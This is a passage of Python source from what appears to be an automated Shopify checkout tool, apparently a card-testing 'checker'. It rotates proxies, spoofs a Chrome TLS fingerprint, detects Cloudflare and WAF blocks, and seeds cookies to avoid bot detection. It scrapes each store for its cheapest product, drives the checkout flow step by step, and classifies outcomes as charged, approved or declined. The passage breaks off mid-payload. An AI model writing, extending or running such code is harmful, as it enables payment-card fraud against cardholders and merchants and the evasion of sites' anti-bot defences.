_PATCH_CTR_RE  = re.compile(r'"countryCode"\s*:\s*"[A-Z]{2}"')
_PATCH_PHN_RE  = re.compile(r'"phoneCountryCode"\s*:\s*"[A-Z]{2}"')
_CURRENCY_RE   = re.compile(r'"currency"\s*:\s*"([A-Z]{3})"')
_CUR_CODE_RE   = re.compile(r'"currencyCode"\s*:\s*"([A-Z]{3})"')
_HTML_DASH_RE  = re.compile(r'<a href="(https?://[^"]+)"[^>]*>[^<]*</a></td><td class="price">\$?([^<]+)</td>')
_NUM_RE        = re.compile(r'[-+]?\d*\.?\d+')

# ══════════════════════════════ GATEWAY TABLES ════════════════════════════════

_GATEWAY_DISPLAY = {
    "shopify_payments":"Shopify Payments","stripe":"Stripe","stripe_donation":"Stripe",
    "stripe_payments":"Stripe","braintree":"Braintree","paypal":"PayPal",
    "paypal_express":"PayPal Express","paypal_express_checkout":"PayPal",
    "authorize_net":"Authorize.net","authorizenet":"Authorize.net","square":"Square",
    "adyen":"Adyen","checkout.com":"Checkout.com","worldpay":"Worldpay",
    "cybersource":"CyberSource","moneris":"Moneris","moneris_us":"Moneris",
    "bambora":"Bambora","global_payments":"Global Payments","elavon":"Elavon",
    "mollie":"Mollie","klarna":"Klarna","afterpay":"Afterpay",
    "afterpay_clearpay":"Afterpay","zip":"Zip","amazon_payments":"Amazon Pay",
    "shop_pay":"Shop Pay","apple_pay":"Apple Pay","google_pay":"Google Pay",
    "bolt":"Bolt","affirm":"Affirm","nmi":"NMI","nuvei":"Nuvei",
    "paysafe":"Paysafe","razorpay":"Razorpay","payu":"PayU","cashfree":"Cashfree",
    "ccavenue":"CCAvenue","eway":"eWay","windcave":"Windcave","bluesnap":"BlueSnap",
    "cybersource_flex":"CyberSource","nuvei_shopify_payments":"Nuvei",
}
_GW_PATS = [
    re.compile(r'"paymentMethodIdentifier"\s*:\s*"[^"]*"\s*,\s*"name"\s*:\s*"([^"]+)"'),
    re.compile(r'"name"\s*:\s*"([^"]+)"\s*,\s*"paymentMethodIdentifier"'),
    re.compile(r'"extensibilityDisplayName"\s*:\s*"([^"]+)"'),
    re.compile(r'"providerDisplayName"\s*:\s*"([^"]+)"'),
    re.compile(r'"paymentProvider"\s*:\s*\{"name"\s*:\s*"([^"]+)"'),
    re.compile(r'"gatewayName"\s*:\s*"([^"]+)"'),
    re.compile(r'"paymentGateway"\s*:\s*"([^"]+)"'),
    re.compile(r'"availablePaymentLines".*?"displayName"\s*:\s*"([^"]+)"', re.DOTALL),
]

# ══════════════════════════════ HELPERS ═══════════════════════════════════════

def normalize_proxy(raw: str) -> str:
    p = raw.strip()
    if not p:
        raise ValueError("empty proxy")
    if "://" not in p:
        parts = p.split(":")
        if len(parts) == 4:
            p = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
        else:
            p = "http://" + p
    parsed = urlparse(p)
    if not parsed.hostname:
        raise ValueError(f"invalid proxy: {raw}")
    return p

def generate_attempt_token(checkout_token: str) -> str:
    suffix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
    return f"{checkout_token}-{suffix}"

def generate_page_id() -> str:
    return str(uuid.uuid4())

def patch_payload(payload: str, currency: str, country: str) -> str:
    payload = _PATCH_CUR_RE.sub(f'"currencyCode": "{currency}"', payload)
    payload = _PATCH_PRES_RE.sub(f'"presentmentCurrency": "{currency}"', payload)
    payload = _PATCH_CTR_RE.sub(f'"countryCode": "{country}"', payload)
    payload = _PATCH_PHN_RE.sub(f'"phoneCountryCode": "{country}"', payload)
    return payload

def is_cloudflare(body: str) -> bool:
    lo = body.lower()
    return ("<title>just a moment" in lo or "cf_chl_" in lo or "cf-chl-" in lo or "jschl_" in lo or
            'id="challenge-running"' in lo or 'id="challenge-form"' in lo or 'class="challenge-form"' in lo or
            "cf-browser-verification" in lo or
            "checking if the site connection is secure" in lo or
            "checking your browser before accessing" in lo or
            "enable javascript and cookies to continue" in lo)

def has_currency_not_supported(body: str) -> bool:
    return "BUYER_IDENTITY_CURRENCY_NOT_SUPPORTED_BY_SHOP" in body

def make_session(proxy_url: str = "") -> curl_requests.Session:
    """curl_cffi session — used only for browser-fingerprinted calls
    (cart add, /checkout page, PAT, actions JS, proposals, PCI, submit, poll).
    Shopify checks TLS fingerprint on these endpoints."""
    s = curl_requests.Session(impersonate="chrome120")
    if proxy_url:
        s.proxies = {"http": proxy_url, "https": proxy_url}
    s.timeout = 20
    return s

def make_api_session(proxy_url: str = "") -> _requests.Session:
    """Plain requests session — used for pure JSON API calls
    (Storefront GraphQL, /products.json, /meta.json, /cart.js).
    No TLS fingerprinting needed; plain requests is faster here."""
    s = _requests.Session()
    _adapter = _requests.adapters.HTTPAdapter(pool_connections=8, pool_maxsize=64)
    s.mount("https://", _adapter)
    s.mount("http://", _adapter)
    if proxy_url:
        s.proxies = {"http": proxy_url, "https": proxy_url}
    s.headers.update({"User-Agent": _UA, "Accept": "application/json"})
    return s

def humanize_gateway(raw: str) -> str:
    lo = raw.strip().lower()
    if lo in _GATEWAY_DISPLAY:
        return _GATEWAY_DISPLAY[lo]
    words = raw.replace("_", " ").replace("-", " ").split()
    return " ".join(w.capitalize() for w in words) if words else raw

def extract_gateway(*bodies: str) -> str:
    for body in bodies:
        if not body:
            continue
        for pat in _GW_PATS:
            m = pat.search(body)
            if m:
                name = m.group(1).strip()
                if name:
                    return humanize_gateway(name)
    return "Shopify Payments"

def classify_proxy(result, proxy_url: str) -> str:
    if not proxy_url:
        return "N/A"
    if result is None:
        return "dead"
    if result.get("status") in ("charged", "approved", "declined"):
        return "live"
    if not result.get("error"):
        return "live"
    s = str(result["error"]).lower()
    dead = ["407","proxy auth","429","rate limit","cloudflare","cf-ray","tls",
            "x509","ssl","no such host","dns","connection reset","connection refused",
            "eof","broken pipe","timeout","deadline","blocked","403"]
    if any(h in s for h in dead):
        return "dead"
    return "dead" if result.get("retryable") else "live"

# ══════════════════════════════ EXTRACTION FUNCTIONS ═════════════════════════

def ext_storefront_token(html: str) -> str:
    for pat in _STOREFRONT_TOKEN_RES:
        m = pat.search(html)
        if m:
            return m.group(1)
    return ""

def ext_checkout_token(url: str) -> str:
    m = _CHECKOUT_TOKEN_RE.search(url)
    return m.group(1) if m else ""

def ext_session_token(html: str) -> str:
    if not html:
        return ""
    for pat in _SESSION_TOKEN_RES:
        m = pat.search(html)
        if m:
            return _html.unescape(m.group(1)).strip('"')
    return ""

def ext_pat_id(html: str) -> str:
    m = _PAT_ID_RE.search(_html.unescape(html))
    return m.group(1) if m else ""

def ext_stable_id(html: str) -> str:
    m = _STABLE_ID_RE.search(_html.unescape(html))
    return m.group(1) if m else ""

def ext_commit_sha(html: str) -> str:
    m = _COMMIT_SHA_RE.search(_html.unescape(html))
    return m.group(1) if m else ""

def ext_source_token(html: str) -> str:
    if not html:
        return ""
    for pat in _SOURCE_TOKEN_RES:
        m = pat.search(html)
        if m:
            return _html.unescape(m.group(1)).strip('"')
    return ""

def ext_ident_sig(html: str) -> str:
    m = _IDENT_SIG_RE.search(_html.unescape(html))
    return m.group(1) if m else ""

def ext_queue_token(body: str) -> str:
    m = _QUEUE_TOKEN_RE.search(body)
    return m.group(1) if m else ""

def ext_receipt_id(body: str) -> str:
    m = _RECEIPT_ID_RE.search(body)
    return m.group(1) if m else ""

def ext_receipt_session_token(body: str) -> str:
    m = _RECEIPT_SESS_RE.search(body)
    return m.group(1) if m else ""

def ext_pci_session_id(body: str) -> str:
    body = (body or "").strip()
    if body:
        # Shopify returns {"id":"east-…"} or {"id":"west-…"} (region varies),
        # so parse the JSON first instead of relying on a hardcoded prefix.
        try:
            obj = json.loads(body)
            if isinstance(obj, dict):
                for key in ("id", "sessionId", "session_id", "token"):
                    sid = obj.get(key)
                    if isinstance(sid, str) and sid:
                        return sid
        except Exception:
            pass
    m = _PCI_SESSION_ID_RE.search(body)
    return m.group(1) if m else ""

def ext_delivery_handle(body: str) -> str:
    try:
        data = json.loads(body) if isinstance(body, str) else body
        if isinstance(data, dict):
            for root in (data.get("data", {}), data):
                for container_key in ("negotiation", "submitForCompletion", "proposal"):
                    cont = root.get(container_key) or {}
                    res = cont.get("result") if isinstance(cont, dict) and "result" in cont else cont
                    for pkey in ("sellerProposal", "buyerProposal", "proposal"):
                        prop = (res.get(pkey) if isinstance(res, dict) else {}) or {}
                        deliv = prop.get("delivery") or {}
                        for ln in deliv.get("deliveryLines") or []:
                            strat = ln.get("selectedDeliveryStrategy") or {}
                            h = strat.get("handle") or (strat.get("deliveryStrategyByHandle") or {}).get("handle")
                            if h and h != "shop_promise":
                                return str(h)
                            for avail in ln.get("availableDeliveryStrategies") or []:
                                h = avail.get("handle") or (avail.get("deliveryStrategyByHandle") or {}).get("handle")
                                if h and h != "shop_promise":
                                    return str(h)
                            for s in ln.get("deliveryStrategies") or []:
                                h = s.get("handle") or (s.get("deliveryStrategyByHandle") or {}).get("handle")
                                if h and h != "shop_promise":
                                    return str(h)
                        deliv_exp = prop.get("deliveryExpectations") or {}
                        for de in deliv_exp.get("deliveryExpectations") or []:
                            dh = de.get("deliveryStrategyHandle")
                            if dh and dh != "shop_promise":
                                return str(dh)
                        for macro in deliv.get("deliveryMacros") or []:
                            for mh in macro.get("deliveryStrategyHandles") or []:
                                if mh and mh != "shop_promise":
                                    return str(mh)
    except Exception:
        pass

    m = _DELIVERY_STRAT_HANDLE_RE.search(body)
    if m and m.group(1) != "shop_promise":
        return m.group(1)

    for rx in (_DELIVERY_HASH_RE, _DELIVERY_BY_HANDLE_RE, _DELIVERY_AVAIL_RE, _DELIVERY_HANDLE_RE, _DELIVERY_RE, _DELIVERY_FB_RE):
        m = rx.search(body)
        if m and m.group(1) != "shop_promise":
            return m.group(1)
    return ""

def ext_signed_handles(body: str) -> list:
    return _SIGNED_HANDLE_RE.findall(body)

def ext_shipping_amount(body: str) -> str:
    m = _SHIPPING_AMT_RE.search(body)
    return m.group(1) if m else "0.00"

def _amt_positive(s) -> bool:
    try:
        return float(str(s).replace(",", "").strip()) > 0
    except (TypeError, ValueError):
        return False

def ext_checkout_total(body: str) -> str:
    zero_val = ""
    for rx in (_CHECKOUT_TOTAL_RE, _SELLER_TOTAL_RE):
        m = rx.search(body)
        if not m:
            continue
        if _amt_positive(m.group(1)):
            return m.group(1)
        if not zero_val:
            zero_val = m.group(1)
    return zero_val

def ext_running_total(body: str) -> str:
    m = _RUNNING_TOTAL_RE.search(body)
    if m and _amt_positive(m.group(1)):
        return m.group(1)
    return m.group(1) if m else ""

def ext_seller_tax_amt(body: str) -> str:
    m = _SELLER_TAX_AMT_RE.search(body)
    return m.group(1) if m else ""

def ext_seller_tax_included_amt(body: str) -> str:
    m = _SELLER_TAX_INCL_RE.search(body)
    return m.group(1) if m else ""

def ext_seller_currency(body: str) -> str:
    m = _SELLER_CUR_RE.search(body)
    return m.group(1) if m else ""

def ext_seller_country(body: str) -> str:
    m = _SELLER_CTR_RE.search(body)
    return m.group(1) if m else ""

def ext_payment_flex_terms_id(body: str) -> str:
    m = _PAY_FLEX_TERMS_RE.search(body)
    return m.group(1) if m else ""

def ext_payment_method_id(body: str) -> str:
    for pat in (_PMI_RE, _PMI2_RE, _PMI3_RE):
        m = pat.search(body)
        if m:
            return m.group(1)
    return ""

def ext_seller_merch_price(body: str) -> str:
    m = _MERCH_PRICE_RE.search(body)
    return m.group(1) if m else ""

def ext_currency_from_html(html: str) -> str:
    u = _html.unescape(html)
    for pat in [re.compile(r'"currency"\s*:\s*"([A-Z]{3})"'),
                re.compile(r'"currencyCode"\s*:\s*"([A-Z]{3})"'),
                re.compile(r'"presentmentCurrency"\s*:\s*"([A-Z]{3})"'),
                re.compile(r'"shopCurrency"\s*:\s*"([A-Z]{3})"')]:
        m = pat.search(u)
        if m and m.group(1) not in ("", "XXX"):
            return m.group(1).upper()
    return ""

def ext_actions_js_url(html: str, shop_url: str) -> str:
    m = _ACTIONS_JS_RE.search(html)
    return shop_url + m.group(1) if m else ""

def ext_processing_js_urls(html: str, shop_url: str) -> list:
    seen, urls = set(), []
    for pat in _PROC_JS_PATS:
        for m in pat.finditer(html):
            u = shop_url + m.group(1)
            if u not in seen:
                seen.add(u); urls.append(u)
    for m in _ALL_JS_RE.finditer(html):
        u = shop_url + m.group(1)
        if u in seen or _SKIP_JS_RE.search(m.group(1)):
            continue
        seen.add(u); urls.append(u)
    return urls

def ext_proposal_id(js: str) -> str:
    m = _PROPOSAL_ID_RE.search(js)
    return m.group(1) if m else ""

def ext_submit_id(js: str) -> str:
    m = _SUBMIT_ID_RE.search(js)
    return m.group(1) if m else ""

def ext_poll_id(js: str) -> str:
    for pat in _POLL_ID_PATS:
        m = pat.search(js)
        if m:
            return m.group(1)
    return ""

def ext_receipt_status_code(body: str, receipt_type: str) -> str:
    if receipt_type in ("SuccessfulReceipt", "ProcessedReceipt"):
        return "ORDER_PAID"
    if receipt_type == "ProcessingReceipt":
        return "PROCESSING"
    mp = _PAY_ERR_CODE_RE.search(body)
    m  = mp or _ERROR_CODE_RE.search(body)
    if m:
        code = m.group(1)
        if "CAPTCHA" in code:
            return "CAPTCHA_REQUIRED"
        return code
    if "CAPTCHA" in body:
        return "CAPTCHA_REQUIRED"
    if receipt_type == "FailedReceipt":
        return "CARD_DECLINED"
    return "UNKNOWN"

# ══════════════════════════════ PRODUCT FETCHING ═════════════════════════════

def fetch_products_resilient(domain: str, session):
    headers = {
        "accept": "application/json, text/plain, */*",
        "referer": domain + "/",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
    }

    # 1. Collection with sort_by=price-ascending (picks lowest price products under cap)
    for endpoint in (
        "/collections/all/products.json?sort_by=price-ascending&limit=250",
        "/products.json?sort_by=price-ascending&limit=250",
        "/products.json?limit=250",
        "/collections/all/products.json?limit=250",
    ):
        try:
            r = session.get(domain + endpoint, headers=headers, timeout=15, allow_redirects=True)
            if r.status_code == 403 and _looks_like_waf_block(r.text):
                return [], False, "waf blocked"
            if r.status_code == 200:
                if r.url:
                    rp = urlparse(str(r.url))
                    new_domain = f"{rp.scheme}://{rp.netloc}"
                    if new_domain != domain:
                        domain = new_domain
                try:
                    prods = r.json().get("products", [])
                    if prods:
                        return prods, False, None
                except Exception:
                    pass
        except Exception as e:
            if _is_proxy_failure(e):
                return [], False, "proxy unreachable"
            return [], False, str(e)[:120]

    # 3. /collections/all HTML scrape for handles + /products/{handle}.js
    try:
        r = session.get(domain + "/collections/all", headers={
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "referer": domain + "/",
        }, timeout=15, allow_redirects=True)
        if r.status_code == 200:
            handles = list(dict.fromkeys(re.findall(r'/products/([a-zA-Z0-9\-_]+)', r.text)))
            handles = [h for h in handles if h not in ("search", "all", "cart", "account")]
            prods = []
            for h in handles[:8]:
                if _over():
                    break
                try:
                    p_resp = session.get(f"{domain}/products/{h}.js", headers=headers, timeout=10, allow_redirects=True)
                    if p_resp.status_code == 200:
                        prods.append(p_resp.json())
                except Exception:
                    pass
            if prods:
                return prods, True, None
    except Exception as e:
        if _is_proxy_failure(e):
            return [], False, "proxy unreachable"
        return [], False, str(e)[:120]

    # 4. /sitemap_products_1.xml
    try:
        r = session.get(domain + "/sitemap_products_1.xml", timeout=15, allow_redirects=True)
        if r.status_code == 200:
            locs = re.findall(r'<loc>[^<]*/products/([^<?#/]+)', r.text)
            handles = list(dict.fromkeys(locs))
            prods = []
            for h in handles[:8]:
                if _over():
                    break
                try:
                    p_resp = session.get(f"{domain}/products/{h}.js", headers=headers, timeout=10, allow_redirects=True)
                    if p_resp.status_code == 200:
                        prods.append(p_resp.json())
                except Exception:
                    pass
            if prods:
                return prods, True, None
    except Exception as e:
        if _is_proxy_failure(e):
            return [], False, "proxy unreachable"
        return [], False, str(e)[:120]

    return [], False, None

def _is_proxy_failure(exc) -> bool:
    s = str(exc).lower()
    return any(k in s for k in ("proxy", "tunnel failed", "cannot connect to proxy",
                                "586", "502 bad gateway", "503 service unavailable",
                                "max retries exceeded", "connrefused", "connection reset"))

# Reasons Step 0 may be retried for. Deliberately excludes a bare
# "no available products at <url>" — that is an empty catalogue, and no amount of
# retrying will fill it.
_STEP0_RETRY_HINTS = (
    "proxy unreachable", "proxy", "tunnel failed", "waf blocked",
    "max retries exceeded", "connrefused", "connection refused",
    "connection reset", "connection aborted", "broken pipe", "eof",
    "temporary failure", "name or service not known", "no such host",
    "dns", "timed out", "timeout", "read timeout", "i/o timeout",
    "502", "503", "504", "429", "too many requests",
    # A transiently-empty catalogue is usually a flaky egress: brand storefronts
    # behind aggressive bot-mitigation answer [] one request and 200 the next.
    # Give an empty result another chance on a rotated proxy before calling the
    # site dead.
    "no available products at", "no available variants at",
)

def step0_retryable(err: str) -> bool:
    lo = (err or "").lower()
    return any(h in lo for h in _STEP0_RETRY_HINTS)

def rotate_step0_proxy(current: str, country: str) -> str:
    """Fresh exit for a Step 0 retry; "" means keep the current proxy.

    Only rotates when the caller supplied a proxy — pulling one from the pool for
    a deliberately-direct request would change the egress the caller asked for.
    """
    if not current:
        return ""
    try:
        fresh = whop_pick_proxy(country)
    except Exception:
        return ""
    return fresh if fresh and fresh != current else ""

def _is_waf_html(exc) -> bool:
    return False

_WAF_MARKERS = ("just a moment", "checking your browser", "enable javascript",
                "attention required", "access denied", "cf-chl", "incapsula",
                "you are unable to access", "blocked", "403 forbidden",
                "verify you are human")

def _looks_like_waf_block(body: str) -> bool:
    low = (body or "").lower()[:20000]
    return any(m in low for m in _WAF_MARKERS)

def find_all_variants(sess, shop_url: str, api_sess=None):
    session = sess or api_sess
    prods, is_cents, why1 = fetch_products_resilient(shop_url, session)
    why2 = None
    if not prods and api_sess and api_sess is not session:
        prods, is_cents, why2 = fetch_products_resilient(shop_url, api_sess)

    why = why1 or why2
    if not prods:
        if why:
            raise Exception(f"no available products at {shop_url} ({why})")
        raise Exception(f"no available products at {shop_url}")

    candidates = []
    # First pass: try variants that require shipping and price > 0
    for p in prods:
        for v in p.get("variants", []):
            if not v.get("available", True) or not v.get("requires_shipping", True):
                continue
            try:
                pr = float(str(v.get("price", "0")).replace(",", ""))
                if is_cents:
                    pr = pr / 100.0
                if pr > 0:
                    price_str = f"{pr:.2f}" if is_cents else str(v.get("price", "0")).replace(",", "")
                    candidates.append({
                        "product_title": p.get("title", ""),
                        "product_id": str(p.get("id", "")),
                        "variant_id": str(v["id"]),
                        "price": pr,
                        "price_str": price_str,
                        "currency": "",
                        "handle": p.get("handle", ""),
                        "requires_shipping": True,
                    })
            except (ValueError, TypeError):
                continue

    # Second pass fallback: any available variant with price > 0
    if not candidates:
        for p in prods:
            for v in p.get("variants", []):
                if not v.get("available", True):
                    continue
                try:
                    pr = float(str(v.get("price", "0")).replace(",", ""))
                    if is_cents:
                        pr = pr / 100.0
                    if pr > 0:
                        price_str = f"{pr:.2f}" if is_cents else str(v.get("price", "0")).replace(",", "")
                        candidates.append({
                            "product_title": p.get("title", ""),
                            "product_id": str(p.get("id", "")),
                            "variant_id": str(v["id"]),
                            "price": pr,
                            "price_str": price_str,
                            "currency": "",
                            "handle": p.get("handle", ""),
                            "requires_shipping": v.get("requires_shipping", True),
                        })
                except (ValueError, TypeError):
                    continue

    if not candidates:
        raise Exception(f"no available variants at {shop_url}")

    candidates.sort(key=lambda x: x["price"])
    return candidates

# ══════════════════════════════ CHECKOUT STEP FUNCTIONS ══════════════════════

def _ckh(shop_url, checkout_url, checkout_token, session_token, build_id, source_token,
         extra=None):
    """Build standard checkout GraphQL headers."""
    h = {
        "accept": "application/json",
        "accept-language": "en-US",
        "content-type": "application/json",
        "origin": shop_url,
        "priority": "u=1, i",
        "referer": checkout_url,
        "sec-ch-ua": _SEC_CH_UA,
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "shopify-checkout-client": "checkout-web/1.0",
        "shopify-checkout-source": f'id="{checkout_token}", type="cn"',
        "user-agent": _UA,
        "x-checkout-one-session-token": session_token,
        "x-checkout-web-build-id": build_id,
        "x-checkout-web-deploy-stage": "production",
        "x-checkout-web-server-handling": "fast",
        "x-checkout-web-server-rendering": "yes",
        "x-checkout-web-source-id": source_token,
    }
    if extra:
        h.update(extra)
    return h

# ─── Step 1 ───────────────────────────────────────────────────────────────────

def step1_add_to_cart(sess, shop_url, variant_id):
    # Seed visitor cookies if not set, avoiding headless-bot detection
    host = urlparse(shop_url).hostname or ""
    try:
        if "_shopify_y" not in sess.cookies:
            sess.cookies.set("_shopify_y", uuid.uuid4().hex, domain=host)
        if "_shopify_s" not in sess.cookies:
            sess.cookies.set("_shopify_s", uuid.uuid4().hex, domain=host)
    except Exception:
        pass

    r = sess.post(shop_url + "/cart/add.js",
                  content=json.dumps({"id": variant_id, "quantity": 1}),
                  headers={
                      "accept": "application/json, text/javascript, */*; q=0.01",
                      "accept-language": "en-US,en;q=0.9",
                      "content-type": "application/json",
                      "origin": shop_url,
                      "referer": shop_url + "/",
                      "sec-ch-ua": _SEC_CH_UA,
                      "sec-ch-ua-mobile": "?0",
                      "sec-ch-ua-platform": '"Windows"',
                      "sec-fetch-dest": "empty",
                      "sec-fetch-mode": "cors",
                      "sec-fetch-site": "same-origin",
                      "x-requested-with": "XMLHttpRequest",
                      "user-agent": _UA,
                  },
                  timeout=20)
    if r.status_code != 200:
        raise Exception(f"POST /cart/add.js returned {r.status_code}")
    time.sleep(random.uniform(0.12, 0.25))
    r2 = sess.get(shop_url + "/checkout",
                  headers={
                      "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
                      "accept-language": "en-US,en;q=0.9",
                      "referer": shop_url + "/cart",
                      "sec-ch-ua": _SEC_CH_UA,
                      "sec-ch-ua-mobile": "?0",
                      "sec-ch-ua-platform": '"Windows"',
                      "sec-fetch-dest": "document",
                      "sec-fetch-mode": "navigate",
                      "sec-fetch-site": "same-origin",
                      "sec-fetch-user": "?1",
                      "upgrade-insecure-requests": "1",
                      "user-agent": _UA,
                  },
                  timeout=20)
    checkout_url   = str(r2.url)
    checkout_html  = r2.text
    checkout_token = ext_checkout_token(checkout_url)
    session_token  = ext_session_token(checkout_html)
    return checkout_url, checkout_token, session_token, checkout_html

# ─── Step 2 ───────────────────────────────────────────────────────────────────

def step2_fetch_pat(sess, shop_url, checkout_url, pat_id):
    r = sess.get(f"{shop_url}/private_access_tokens?id={quote(pat_id)}&checkout_type=c1",
                 headers={"accept":"*/*","accept-language":"en-US,en;q=0.9",
                          "referer":checkout_url,"sec-ch-ua":_SEC_CH_UA,
                          "sec-ch-ua-mobile":"?0","sec-ch-ua-platform":'"Windows"',
                          "sec-fetch-dest":"empty","sec-fetch-mode":"cors",
                          "sec-fetch-site":"same-origin","user-agent":_UA},
                 timeout=15)
    return r.status_code, r.text

# ─── Step 3 ───────────────────────────────────────────────────────────────────

def step3_fetch_actions_js(sess, actions_url, shop_url):
    r = sess.get(actions_url, headers={
        "accept":"*/*","accept-language":"en-US,en;q=0.9","origin":shop_url,
        "priority":"u=1","sec-ch-ua":_SEC_CH_UA,"sec-ch-ua-mobile":"?0",
        "sec-ch-ua-platform":'"Windows"',"sec-fetch-dest":"script",
        "sec-fetch-mode":"cors","sec-fetch-site":"same-origin","user-agent":_UA},
        timeout=20)
    if r.status_code != 200:
        raise Exception(f"actions JS returned HTTP {r.status_code}")
    return r.text

# ─── Step 3 fallback: scan the checkout bundles for the query ids ────────────
# Every Shopify build renames its checkout chunks, so the legacy `c1/actions*.js`
# bundle disappears and the Proposal / SubmitForCompletion ids move into a
# content-hashed chunk with no hint in its name. When the legacy bundle is gone
# we scan the chunk list the checkout HTML itself references, in parallel waves,
# and stop as soon as both ids turn up. The result is cached per build so only
# the first checkout of a given version pays for the scan.
_ACTION_ID_CACHE = {}
_ACTION_ID_CACHE_MAX = 32
_ACTION_SCAN_WAVE = 64

# The checkout build is a global Shopify deployment shared by every store, and
# its chunks are public + immutable. We fetch them through ONE keep-alive
# requests session: a fresh connection per chunk (as before) costs hundreds of
# DNS/TLS handshakes and blows the checkout deadline before the scan reaches
# the chunk that holds the Proposal/SubmitForCompletion persisted-query ids.
_CDN_SESSION = _requests.Session()

_PRELOAD_RE = re.compile(r'href="([^"]+\.js)"[^>]*rel="modulepreload"')


def _asset_urls_from_html(html: str) -> list:
    pre    = _PRELOAD_RE.findall(html)
    chunks = re.findall(r'(/cdn/shopifycloud/checkout-web/assets/[A-Za-z0-9_/.-]+\.js)', html)
    seen, out = set(), []
    for u in pre + chunks:
        if u not in seen:
            seen.add(u)
            out.append(u)
    return out


def _fetch_asset_body(full_url: str) -> str:
    # Public, immutable, hashed CDN assets: fetched direct. Pushing each chunk
    # through the checkout proxy would spend the deadline on files that carry no
    # session state and are byte-identical for every caller.
    try:
        r = _CDN_SESSION.get(full_url, timeout=8, headers={"user-agent": _UA, "accept": "*/*"})
        if r.status_code == 200:
            return r.text
    except Exception:
        pass
    return ""


def step3_locate_action_ids(shop_url: str, html: str, build_id: str = "") -> str:
    from concurrent.futures import ThreadPoolExecutor
    urls = _asset_urls_from_html(html)
    if not urls:
        raise Exception("no checkout bundles referenced by the checkout page")
    key = build_id or ("u" + hashlib.sha1("|".join(sorted(urls)).encode()).hexdigest()[:20])
    cached = _ACTION_ID_CACHE.get(key)
    if cached:
        return cached
    props = ""
    subs = ""
    for i in range(0, len(urls), _ACTION_SCAN_WAVE):
        if _over():
            break
        with ThreadPoolExecutor(max_workers=_ACTION_SCAN_WAVE) as ex:
            bodies = list(ex.map(lambda u: _fetch_asset_body(shop_url + u),
                                 urls[i:i + _ACTION_SCAN_WAVE]))
        for body in bodies:
            if not body:
                continue
            if not props and _PROPOSAL_ID_RE.search(body):
                props = body
            if not subs and _SUBMIT_ID_RE.search(body):
                subs = body
            if props and subs:
                break
        if props and subs:
            break
    if not props or not subs:
        raise Exception("Proposal/Submit ids not found in checkout bundles")
    js_body = props if props is subs else props + "\n" + subs
    if len(_ACTION_ID_CACHE) >= _ACTION_ID_CACHE_MAX:
        _ACTION_ID_CACHE.pop(next(iter(_ACTION_ID_CACHE)))
    _ACTION_ID_CACHE[key] = js_body
    return js_body

# ─── Proposal payload builder (Steps 4-8) ────────────────────────────────────

def _build_proposal(session_token, queue_token, stable_id, variant_id,
                    proposal_id, email=None, addr=None, requires_shipping: bool = True):
    """
    Builds the Proposal GraphQL JSON payload.
    - queue_token=None  → first proposal (no queue)
    - email=None        → proposal without email
    - addr=None         → partial address (empty fields)
    - requires_shipping → whether merchandise requires delivery
    """
    qt = "null" if queue_token is None else json.dumps(queue_token)

    if addr:
        dest = f'''"destination": {{
              "partialStreetAddress": {{
                "address1": {json.dumps(addr["address1"])},
                "address2": {json.dumps(addr["address2"])},
                "city": {json.dumps(addr["city"])},
                "countryCode": {json.dumps(addr["country_code"])},
                "postalCode": {json.dumps(addr["postal_code"])},
                "firstName": {json.dumps(addr["first_name"])},
                "lastName": {json.dumps(addr["last_name"])},
                "zoneCode": {json.dumps(addr["zone_code"])},
                "phone": {json.dumps(addr["phone"])},
                "oneTimeUse": false
              }}
            }}'''
        billing = f'''"billingAddress": {{
        "streetAddress": {{
          "address1": {json.dumps(addr["address1"])},
          "address2": {json.dumps(addr["address2"])},
          "city": {json.dumps(addr["city"])},
          "countryCode": {json.dumps(addr["country_code"])},
          "postalCode": {json.dumps(addr["postal_code"])},
          "firstName": {json.dumps(addr["first_name"])},
          "lastName": {json.dumps(addr["last_name"])},
          "zoneCode": {json.dumps(addr["zone_code"])},
          "phone": {json.dumps(addr["phone"])}
        }}
      }}'''
    else:
        dest = '''"destination": {
              "partialStreetAddress": {
                "address1": "", "city": "", "countryCode": "US",
                "lastName": "", "phone": "", "oneTimeUse": false
              }
            }'''
        billing = '''"billingAddress": {
        "streetAddress": {
          "address1": "", "city": "", "countryCode": "US",
          "lastName": "", "phone": ""
        }
      }'''

    email_block = ""
    if email is not None:
        changed = "false" if addr else "true"
        email_block = f',\n      "email": {json.dumps(email)},\n      "emailChanged": {changed}'

    if not requires_shipping:
        deliv_lines_block = f'''"destination": null,
          "selectedDeliveryStrategy": {{
            "deliveryStrategyMatchingConditions": {{
              "estimatedTimeInTransit": {{"any": true}},
              "shipments": {{"any": true}}
            }},
            "options": {{}}
          }},
          "targetMerchandiseLines": {{"any": true}},
          "deliveryMethodTypes": ["NONE"],
          "expectedTotalPrice": {{"any": true}},
          "destinationChanged": false'''
    else:
        deliv_lines_block = f'''{dest},
          "selectedDeliveryStrategy": {{
            "deliveryStrategyMatchingConditions": {{
              "estimatedTimeInTransit": {{"any": true}},
              "shipments": {{"any": true}}
            }},
            "options": {{}}
          }},
          "targetMerchandiseLines": {{"any": true}},
          "deliveryMethodTypes": ["SHIPPING"],
          "expectedTotalPrice": {{"any": true}},
          "destinationChanged": true'''

    return f'''{{
  "variables": {{
    "sessionInput": {{"sessionToken": {json.dumps(session_token)}}},
    "queueToken": {qt},
    "discounts": {{"lines": [], "acceptUnexpectedDiscounts": true}},
    "delivery": {{
      "deliveryLines": [
        {{
          {deliv_lines_block}
        }}
      ],
      "noDeliveryRequired": [],
      "useProgressiveRates": false,
      "prefetchShippingRatesStrategy": null,
      "supportsSplitShipping": true
    }},
    "deliveryExpectations": {{"deliveryExpectationLines": []}},
    "merchandise": {{
      "merchandiseLines": [
        {{
          "stableId": {json.dumps(stable_id)},
          "merchandise": {{
            "productVariantReference": {{
              "id": "gid://shopify/ProductVariantMerchandise/{variant_id}",
              "variantId": "gid://shopify/ProductVariant/{variant_id}",
              "properties": [],
              "sellingPlanId": null,
              "sellingPlanDigest": null
            }}
